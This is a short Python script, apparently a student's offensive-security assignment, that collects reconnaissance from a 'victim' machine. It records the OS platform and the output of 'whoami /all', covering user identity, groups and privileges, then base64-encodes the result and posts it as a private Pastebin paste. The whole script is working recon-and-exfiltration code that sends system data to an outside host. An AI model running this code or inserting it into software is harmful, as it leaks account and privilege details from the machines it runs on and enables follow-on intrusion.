#Reynard Nicholas
#2301860463
#LA07

import base64,platform
from subprocess import PIPE, Popen
from requests.api import post


API_ENDPOINT = 'https://pastebin.com/api/api_post.php'
API_KEY = ''

msg="Recon result\n"

msg+=f"victim OS: {platform.platform()}\n\n"

process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
result, error = process.communicate()
if result == b'':
    msg+= error.decode()
else:
    msg+= result.decode()
newmessage = base64.b64encode(msg.encode())
print(newmessage)

data = {
    'api_dev_key': API_KEY,
    'api_option': 'paste',
    'api_paste_private': '1',
    'api_paste_code': newmessage,
    'api_paste_name': 'tugas_pastebin'
}

response = post(url=API_ENDPOINT,data=data)

if response.status_code==200:
    print(f'{response.text}')